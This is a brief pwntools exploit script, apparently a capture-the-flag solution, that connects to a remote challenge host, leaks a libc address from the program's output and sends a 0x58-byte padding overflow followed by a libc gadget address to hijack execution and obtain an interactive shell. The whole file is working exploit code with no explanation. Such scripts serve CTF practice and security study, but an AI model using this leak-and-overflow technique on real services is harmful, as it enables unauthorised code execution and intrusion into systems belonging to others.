from pwn import *

#io = process('./chall')
io = remote('210.30.97.133',28049)
context.log_level = 'debug'

pause()
io.recvuntil(b'name?\n')
io.sendline(b'')

io.recvuntil(b'\x2c\x20')
libc_base = u64(io.recv(6).ljust(0x8,b'\x00'))
libc_base = libc_base - 0x1f12e8
success('libc base--->' + hex(libc_base))

country = b'a' * 0x58
country += p64(libc_base + 0xe3b01)

io.recvuntil(b'in?\n')
io.sendline(country)

io.interactive()


